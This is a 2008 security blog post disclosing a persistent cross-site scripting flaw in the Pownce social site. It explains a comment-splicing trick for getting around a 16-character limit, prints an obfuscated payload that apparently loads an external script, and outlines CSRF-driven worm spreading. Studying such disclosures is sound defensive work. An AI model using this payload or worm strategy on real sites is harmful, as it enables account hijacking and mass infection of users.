---
title: The Pownce Worm (Yet Another Potential AJAX Worm)
author: petko-d-petkov
date: Wed, 13 Feb 2008 08:31:02 GMT
template: post.jade
category: fucked
---

First of all I need to let you know that it is not within our practice to disclose vulnerabilities on specific online applications. However, given the fact that [Pownce](http://pownce.com/), the vendor, was responsibly informed and the fact that we believe that the issue is interesting enough to be discussed, we've decided to let you know about our findings.

First of all, what's Pownce:

> Pownce is a social networking and micro-blogging site started by Internet entrepreneurs Kevin Rose, Leah Culver, Daniel Burka, and Shawn Allen. Pownce is centered around sharing messages, files, events, and links with already-established friends. Much like Twitter.

**Here is the story:** A couple of days ago I was interested in putting together some research on client-side vulnerabilities found within Adobe AIR applications. The material was supposed to go into my Black Hat talk, which is happening on 27-28 March, btw. I've heard that Pownce's IM client uses Adobe AIR, so I thought that this could be a perfect example I can make use of. Although, there are some very obvious vulnerabilities within the client, which I've tested offline btw, I noticed that parts of the requests delivered from the server does not seem to be sanitized at all. After further investigation, I noticed that my personal profile is vulnerable to attack known as Persistent Cross-site Scripting, which is the most serious type of all Cross-site Scripting attacks.

The Cross-Site Scripting condition occurs within a very obscure place and it is restricted to 16 characters. Because of the space restrictions, I was able only inject things like `<script>alert(1)` and this was pretty much it. Obviously, this is not enough for even an `alert(1)` command, so other methods for execution were needed in order to make the vector successfully exploitable.

After scratching my head for a few minutes, I figured out that there is user-supplied data between the area of injection and the bottom of the page. Though, the input fields that control that data successfully sanitize HTML meta characters. Although, we are restricted in terms of space, attackers can make use of limited XSS injection issue combined with the extra **sanitized** user-supplied data in order to cause a successful persistent Cross-site Scripting. Let's examine the following diagram:

    [html junk]

      [point of injection; 16 chars max]

    [html junk]

      [correctly sanitized, safely rendered user-supplied data]

    [html junk]

    So, in order to store the attack, we need to inject something within the 16 characters that will make the rest up to the `[correctly sanitized, safely rendered user-supplied data]` block under the attacker's control. Here how it is done:

    [html junk]

      */<script>/*

    [html junk]

      */ **XSS Payload which does not need to contain HTML meta characters** /*

    [html junk]

    Do you see the magic? After the `<script>` tag we start a JavaScript comment block (`/*`). The block continues down the page source code until it reaches the characters `*/` which are part of the `[correctly sanitized, safely rendered user-supplied data]` block. This user-supplied field is much bigger and contains up to 160 characters, which is enough for injecting an external script, which on its own can deliver as much malicious functionalities within the infected profile as needed. Let's examine the diagram of demonstration attack which I wrote and deliberately made it work only for Firefox and limited to the logged in user which profile was affected:

    [html junk]

      */<script>/*

    [html junk]

      */document.write(atob(/PHNjcmlwdCBzcmM9Imh0dHA6Ly9ja2Vycy5vcmcvcyI+PC9zY3JpcHQ+PCEtLQ==/.toString().substr(1,56)));/*

    [html junk]

There you go! The Injection Point and the XSSed profile look like like screens bellow:

<div class="screen">[![Pownce Screen01](/files/2008/02/pownce-screen01-248x150.jpg "Pownce Screen01") <a href="/files/2008/02/pownce-screen02.jpg">![Pownce Screen02](/files/2008/02/pownce-screen02-248x150.jpg "Pownce Screen02")](/files/2008/02/pownce-screen01.jpg)</a></div>

Unfortunately there is more to that. The profile page is also vulnerable to Cross-site Request Forgery attacks. This means that if the user is logged in and he/she visits a malicious site, his/her profile will get infected permanently with the provided evil code. I am not planning to spend time explaining why is that a problem.

### The AJAX Worms

The first question is whether the vulnerability is wormable. Obviously, it is. Not to mention that it is even trivially exploitable via CSRF. This means that attackers would have probably initiated two different strategies. The first one will be kind of what the typical AJAX Worm implements, i.e. propagate through profile infections. The second strategy is weirder. Because each profile can be easily modified via CSRF, attackers can launch a gigantic campaign in which hundreds upon thousands of malicious links will be spread across the network. Once unaware users visit them, they will get exploited and their account will be infected with the wormable code.

By using both strategies simultaneously, attackers can reach a network domination before the good guys find out what's going on. The good thing is that we caught the problem before becoming a disaster.
